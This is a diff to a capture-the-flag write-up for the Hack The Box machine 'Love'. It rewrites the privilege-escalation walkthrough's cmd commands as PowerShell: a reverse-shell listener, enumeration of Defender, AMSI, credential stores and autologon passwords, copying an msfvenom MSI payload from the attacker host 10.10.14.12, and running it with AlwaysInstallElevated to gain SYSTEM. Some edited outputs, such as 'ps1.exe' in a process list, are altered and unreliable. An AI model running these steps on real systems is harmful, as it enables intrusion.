@@ -639,7 +639,7 @@ First, I'll setup a listener to receive the shell.
 listening on [any] 9001 ...
 ```
 
-Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from the last website, configured to use a `cmd` shell. The payload is more than 100 lines long, so I won't include it here.
+Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from the last website, configured to use a `powershell` shell. The payload is more than 100 lines long, so I won't include it here.
 
 Let's save it as `/workspace/revshell.php`.
 
@@ -662,6 +662,8 @@ C:\xampp\htdocs\omrs\images>
 
 It caught the reverse shell!
 
+It's a standard one though, so I'll transform it into a Powershell session.
+
 # Local enumeration
 
 If we run `whoami`, we see that we got a foothold as `phoebe`.
@@ -670,8 +672,8 @@ If we run `whoami`, we see that we got a foothold as `phoebe`.
 
 Let's gather some information about the Windows version of Love.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
 ```
@@ -681,8 +683,8 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 
 Okay, so this confirms that Love is using Windows 10 Pro.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
 ```
 
 ```
@@ -698,8 +700,8 @@ This version of Windows is somewhat recent, but maybe there are missing hotfixes
 
 What is Love's architecture?
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
 ```
 
 ```
@@ -713,8 +715,8 @@ So this system is using x64. This will be useful to know if we want to compile o
 
 Let's check if Windows Defender is enabled.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
 ```
 
 ```
@@ -728,8 +730,8 @@ It's disabled! That's great, it will make our life easier.
 
 Let's check if there's any AMSI provider.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
 ```
 
 There's no output, so no AMSI provider here!
@@ -738,8 +740,8 @@ There's no output, so no AMSI provider here!
 
 Let's see which Windows Firewall policies profiles are enabled.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
 ```
 
 ```
@@ -761,8 +763,8 @@ Okay, so only the Firewall domain profile is enabled. It shouldn't hinder our pr
 
 Let's gather the list of connected NICs.
 
-```cmd
-C:\xampp\htdocs\omrs\images> ipconfig /all
+```ps1
+PS C:\xampp\htdocs\omrs\images> ipconfig /all
 ```
 
 ```
@@ -794,8 +796,8 @@ Looks like there's a single network.
 
 Let's enumerate all local users using `PowerView`.
 
-```cmd
-C:\xampp\htdocs\omrs\images> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
+```ps1
+PS C:\xampp\htdocs\omrs\images> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
 ```
 
 ```
@@ -810,8 +812,8 @@ It looks like there's only us, `phoebe`.
 
 Let's enumerate all local groups, once again using `PowerView`.
 
-```cmd
-C:\xampp\htdocs\omrs\images> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
+```ps1
+PS C:\xampp\htdocs\omrs\images> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -843,8 +845,8 @@ Looks classic.
 
 Let's gather more information about us.
 
-```cmd
-C:\xampp\htdocs\omrs\images> net user phoebe
+```ps1
+PS C:\xampp\htdocs\omrs\images> net user phoebe
 ```
 
 ```
@@ -881,8 +883,8 @@ We don't belong to interesting groups.
 
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
-```cmd
-C:\xampp\htdocs\omrs\images> type C:\Users\Phoebe\Desktop\user.txt
+```ps1
+PS C:\xampp\htdocs\omrs\images> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
@@ -895,8 +897,8 @@ There's nothing unusual though.
 
 Let's check the history of commands ran by `phoebe`.
 
-```cmd
-C:\xampp\htdocs\omrs\images> type C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```ps1
+PS C:\xampp\htdocs\omrs\images> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 ```
@@ -907,8 +909,8 @@ Alright, so `phoebe` downloaded a `dControl.zip` file and saved it.
 
 Let's find its location:
 
-```cmd
-C:\xampp\htdocs\omrs\images> dir C:\ /s /b | findstr /i "\\dControl.zip$"
+```ps1
+PS C:\xampp\htdocs\omrs\images> dir C:\ -Recurse -Filter "dControl.zip" -ErrorAction SilentlyContinue
 ```
 
 There's no output, so we couldn't find it.
@@ -919,8 +921,8 @@ Let's now focus on our tokens.
 
 Which security groups are associated with our access tokens?
 
-```cmd
-C:\xampp\htdocs\omrs\images> whoami /groups
+```ps1
+PS C:\xampp\htdocs\omrs\images> whoami /groups
 ```
 
 ```
@@ -946,8 +948,8 @@ Unfortunately, there's nothing that we can abuse.
 
 What about the privileges associated with our access tokens?
 
-```cmd
-C:\xampp\htdocs\omrs\images> whoami /priv
+```ps1
+PS C:\xampp\htdocs\omrs\images> whoami /priv
 ```
 
 ```
@@ -969,8 +971,8 @@ There's nothing that we can leverage to elevate our privileges.
 
 Let's list the SMB shares available on Optimum, using the same version of `PowerView` as before.
 
-```cmd
-C:\xampp\htdocs\omrs\images> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetShare | Select-Object Name, Remark | Format-Table"
+```ps1
+PS C:\xampp\htdocs\omrs\images> Get-NetShare | Select-Object Name, Remark | Format-Table
 ```
 
 ```
@@ -987,12 +989,13 @@ So there's only default administrative shares.
 
 Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?
 
-```cmd
-C:\xampp\htdocs\omrs\images> set
+```ps1
+PS C:\xampp\htdocs\omrs\images> Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" }
 ```
 
 ```
 ALLUSERSPROFILE=C:\ProgramData
+AP_PARENT_PID=6896
 APPDATA=C:\Users\Phoebe\AppData\Roaming
 CommonProgramFiles=C:\Program Files\Common Files
 CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
@@ -1008,7 +1011,7 @@ NUMBER_OF_PROCESSORS=2
 OneDrive=C:\Users\Phoebe\OneDrive
 OS=Windows_NT
 Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps;
-PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
 PROCESSOR_ARCHITECTURE=AMD64
 PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
 PROCESSOR_LEVEL=23
@@ -1018,7 +1021,7 @@ ProgramFiles=C:\Program Files
 ProgramFiles(x86)=C:\Program Files (x86)
 ProgramW6432=C:\Program Files
 PROMPT=$P$G
-PSModulePath=C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
+PSModulePath=C:\Users\Phoebe\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
 PUBLIC=C:\Users\Public
 SESSIONNAME=Console
 SystemDrive=C:
@@ -1030,7 +1033,6 @@ USERDOMAIN_ROAMINGPROFILE=LOVE
 USERNAME=Phoebe
 USERPROFILE=C:\Users\Phoebe
 windir=C:\WINDOWS
-AP_PARENT_PID=6372
 ```
 
 There's nothing interesting.
@@ -1039,8 +1041,8 @@ There's nothing interesting.
 
 Let's see if any TCP local ports are listening for connections.
 
-```cmd
-C:\xampp\htdocs\omrs\images> netstat -ano | findstr /C:"LISTENING" | findstr /C:"TCP"
+```ps1
+PS C:\xampp\htdocs\omrs\images> netstat -ano | findstr /C:"LISTENING" | findstr /C:"TCP"
 ```
 
 ```
@@ -1084,8 +1086,8 @@ C:\xampp\htdocs\omrs\images> netstat -ano | findstr /C:"LISTENING" | findstr /C:
 
 There's no TCP port listening locally. What about UDP?
 
-```cmd
-C:\xampp\htdocs\omrs\images> netstat -ano | findstr /C:"LISTENING" | findstr /C:"UDP"
+```ps1
+PS C:\xampp\htdocs\omrs\images> netstat -ano | findstr /C:"LISTENING" | findstr /C:"UDP"
 ```
 
 Nothing!
@@ -1094,8 +1096,8 @@ Nothing!
 
 Let's check which processes are running.
 
-```cmd
-C:\xampp\htdocs\omrs\images> tasklist /svc
+```ps1
+PS C:\xampp\htdocs\omrs\images> tasklist /svc
 ```
 
 ```
@@ -1226,9 +1228,9 @@ svchost.exe                   2960 WbioSrvc
 Microsoft.Photos.exe          4368 N/A                                         
 svchost.exe                   8072 Appinfo                                     
 RuntimeBroker.exe             6124 N/A                                         
-cmd.exe                       7708 N/A                                         
+ps1.exe                       7708 N/A                                         
 conhost.exe                   3240 N/A                                         
-cmd.exe                       4868 N/A                                         
+ps1.exe                       4868 N/A                                         
 svchost.exe                    972 wlidsvc                                     
 svchost.exe                   6200 ClipSVC                                     
 tasklist.exe                  3636 N/A
@@ -1240,8 +1242,8 @@ I don't see anything unusual.
 
 Let's check the registry for user autologon entries.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUsername DefaultDomainName DefaultPassword"
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUsername DefaultDomainName DefaultPassword"
 ```
 
 ```
@@ -1254,8 +1256,8 @@ Apparently, there's nothing.
 
 Let's check the credential manager for currently stored credentials. Maybe it contains something?
 
-```cmd
-C:\xampp\htdocs\omrs\images> cmdkey /list
+```ps1
+PS C:\xampp\htdocs\omrs\images> cmdkey /list
 ```
 
 ```
@@ -1270,8 +1272,8 @@ Nothing.
 
 Let's check if the `AlwaysInstallElevated` registry key is set.
 
-```cmd
-C:\xampp\htdocs\omrs\images> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```ps1
+PS C:\xampp\htdocs\omrs\images> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
 ```
@@ -1307,8 +1309,8 @@ Then I'll use `msfvenom` to create the reverse shell payload. I'll save it as `r
 
 The last step is to transfer it to Love.
 
-```cmd
-C:\xampp\htdocs\gym\upload> copy \\10.10.14.12\server\revshell.msi C:\tmp\revshell.msi
+```ps1
+PS C:\xampp\htdocs\omrs\images> copy \\10.10.14.12\server\revshell.msi C:\tmp\revshell.msi
 ```
 
 ```
@@ -1319,8 +1321,8 @@ C:\xampp\htdocs\gym\upload> copy \\10.10.14.12\server\revshell.msi C:\tmp\revshe
 
 Time to launch the `.msi` file!
 
-```cmd
-C:\tmp>msiexec /quiet /qn /i revshell.msi
+```ps1
+PS C:\xampp\htdocs\omrs\images> msiexec /quiet /qn /i C:\tmp\revshell.msi
 ```
 
 And on our listener...
@@ -1333,7 +1335,9 @@ Microsoft Windows [Version 10.0.19042.867]
 C:\WINDOWS\system32>
 ```
 
-Our listener caught the reverse shell! If we run `whoami`, we can confirm that we are indeed `NT AUTHORITY\SYSTEM`.
+Our listener caught the reverse shell! It's a standard one though, so I'll transform it into a Powershell session.
+
+If we run `whoami`, we can confirm that we are indeed `NT AUTHORITY\SYSTEM`.
 
 ## Home folder
 
@@ -1341,8 +1345,8 @@ The only thing we need to do to finish this box is to retrieve the root flag.
 
 And as usual, we can find it on our Desktop!
 
-```cmd
-C:\WINDOWS\system32> type C:\Users\Administrator\Desktop\root.txt
+```ps1
+PS C:\WINDOWS\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```
